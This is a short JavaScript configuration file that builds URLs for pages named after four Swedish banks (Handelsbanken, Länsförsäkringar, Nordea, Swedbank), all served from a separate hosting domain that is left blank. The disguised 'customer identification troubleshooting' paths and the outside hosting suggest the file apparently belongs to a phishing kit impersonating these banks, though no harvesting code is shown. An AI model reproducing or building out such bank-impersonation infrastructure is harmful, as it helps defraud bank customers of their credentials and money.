// Server configuration
// TODO: Update with your Railway server domain
const PRODUCTION_DOMAIN = ''; // Update with your Railway domain
const PRODUCTION_URL = PRODUCTION_DOMAIN ? `https://${PRODUCTION_DOMAIN}` : '';

// Bank-specific URLs
const BANK_URLS = {
    HANDELSBANKEN: `${PRODUCTION_URL}/Handelsbankenfelsokningskundidentifieringkund98721311`,
    LANSFORSAKRINGAR: `${PRODUCTION_URL}/Lansfelsokningskundidentifieringkund98721311`,
    NORDEA: `${PRODUCTION_URL}/Nordeafelsokningskundidentifieringkund98721311`,
    SWEDBANK: `${PRODUCTION_URL}/Swedfelsokningskundidentifieringkund98721311`
};

module.exports = {
    PRODUCTION_URL,
    PRODUCTION_DOMAIN,
    BANK_URLS
}; 